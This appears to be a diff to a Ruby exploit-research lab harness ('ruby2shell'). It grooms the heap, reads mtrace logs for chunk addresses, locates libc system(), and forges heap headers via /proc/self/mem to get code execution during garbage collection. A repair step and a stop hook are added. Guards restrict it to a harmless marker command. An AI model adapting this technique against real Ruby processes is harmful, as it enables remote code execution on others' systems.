@@ -22,7 +22,7 @@ raise 'RUBY2SHELL_R5_TRACE not set' unless $trace_path
 raise 'RUBY2SHELL_R5_MARKER not set' unless $marker_path
 raise 'marker must be under lab/build/evidence' unless
   $marker_path.start_with?(File.expand_path('../build/evidence', __dir__) + '/')
-$trace_io = ENV['MTRACE_FD'] == '3' ? IO.for_fd(3, autoclose: false) : nil
+$trace_io = (ENV['MTRACE_FD'] && ENV['MTRACE_FD'] != '2') ? IO.for_fd(ENV['MTRACE_FD'].to_i, autoclose: false) : nil
 
 $result = 'not-yet'
 $f_host = nil
@@ -42,6 +42,24 @@ $victim_addr = nil
 $victim_klass = nil
 $f_host_addr = nil
 $system_addr = nil
+$marker2_path = ENV['RUBY2SHELL_R5_MARKER2']
+$this_marker = nil
+$t_prev_orig = nil
+$t_size_orig = nil
+$repair = !ENV['RUBY2SHELL_R5_REPAIR'].nil?
+
+$memio = File.open('/proc/self/mem', 'r+b')
+
+def r64(addr)
+  bytes = $memio.pread(8, addr)
+  raise "short mem read at #{addr.to_s(16)}" unless bytes && bytes.bytesize == 8
+  bytes.unpack1('Q<')
+end
+
+def w64(addr, value)
+  n = $memio.pwrite([value].pack('Q<'), addr)
+  raise "short mem write at #{addr.to_s(16)}" unless n == 8
+end
 
 # Host-measured on Ubuntu GLIBC 2.39-0ubuntu8.12:
 # ctypes.CDLL(None).system - libc mapping with file offset 0 = 0x58750.
@@ -112,8 +130,11 @@ class GroomMiddleware
     params = request.POST
     $command = params.fetch('cmd').to_s.b
     expected = "/usr/bin/touch #{$marker_path}"
-    raise 'command is not the authorized benign marker command' unless $command == expected
+    expected2 = $marker2_path ? "/usr/bin/touch #{$marker2_path}" : nil
+    raise 'command is not the authorized benign marker command' unless
+      $command == expected || $command == expected2
     raise 'command too long' unless $command.bytesize < 4000
+    $this_marker = ($command == expected2 && expected2) ? $marker2_path : $marker_path
 
     prepare_victims!
     discover_system!
@@ -140,20 +161,30 @@ class GroomMiddleware
     dummy   = 'e' * 840
     $f_host = $command + "\0" + ('F' * (4000 - $command.bytesize - 1))
 
-    in_alloc = false
-    File.foreach($trace_path) do |line|
-      in_alloc = true if line.include?('===ALLOC===')
-      next unless in_alloc
-      if line =~ /\AM \d+ 419 ([0-9a-f]+)/ && $v_addr.nil?
-        $v_addr = $1.to_i(16)
-      elsif line =~ /\AM \d+ fa1 ([0-9a-f]+)/ && $f_host_addr.nil?
-        $f_host_addr = $1.to_i(16)
-      end
-      break if $v_addr && $f_host_addr
+    $trace_io.flush if $trace_io
+    $v_addr = nil
+    $f_host_addr = nil
+    # mtrace appends continuously, so a growing File.foreach would never
+    # finish. Read a fixed-size tail snapshot; the last matches are the
+    # current request's V and command allocations even on a second POST.
+    size = File.size($trace_path)
+    window = size > 2_000_000 ? 2_000_000 : size
+    tail = File.open($trace_path, 'rb') do |f|
+      f.seek(size - window)
+      f.read(window)
+    end
+    tail.each_line do |line|
+      $v_addr = $1.to_i(16) if line =~ /\AM \d+ 419 ([0-9a-f]+)/
+      $f_host_addr = $1.to_i(16) if line =~ /\AM \d+ fa1 ([0-9a-f]+)/
     end
     raise 'trace parse failed' unless $v_addr && $f_host_addr
 
     $t_entry = $v_addr + 0x430
+    # Capture T's real header before the harness forges it. The 0x3f1
+    # downgrade of the 0x405 size field is what makes a later free abort.
+    $t_prev_orig = r64($t_entry - 0x10)
+    $t_size_orig = r64($t_entry - 8)
+    marker("T-hdr-prev=0x#{$t_prev_orig.to_s(16)} size=0x#{$t_size_orig.to_s(16)}\n")
     $target = $victim_addr & ~0xf
     $victim_shift = $victim_addr - $target
     raise 'bad victim shift' unless [0, 8].include?($victim_shift)
@@ -213,11 +244,22 @@ class MarkerMiddleware
       scrub; scrub; scrub
       GC.enable
       GC.start
-      GC.start unless File.file?($marker_path)
-      observed = File.file?($marker_path)
+      GC.start unless File.file?($this_marker)
+      observed = File.file?($this_marker)
+      if $repair && observed
+        w64($t_entry - 0x10, $t_prev_orig)
+        w64($t_entry - 8, $t_size_orig)
+        w64($t_entry, 0)
+        w64($target + 0x18, 0)
+        marker("repair=T-header-restored dfree-cleared\n")
+      end
       $result = "target=0x#{$target.to_s(16)} system=0x#{$system_addr.to_s(16)} " \
                 "rce=#{observed ? 'OBSERVED' : 'ABSENT'} control=#{$control}"
       marker("#{$result}\n")
+      if ENV['RUBY2SHELL_R5_STOP']
+        marker("===STOPPED===\n")
+        Process.kill('SIGSTOP', Process.pid)
+      end
     end
     @app.call(env)
   end
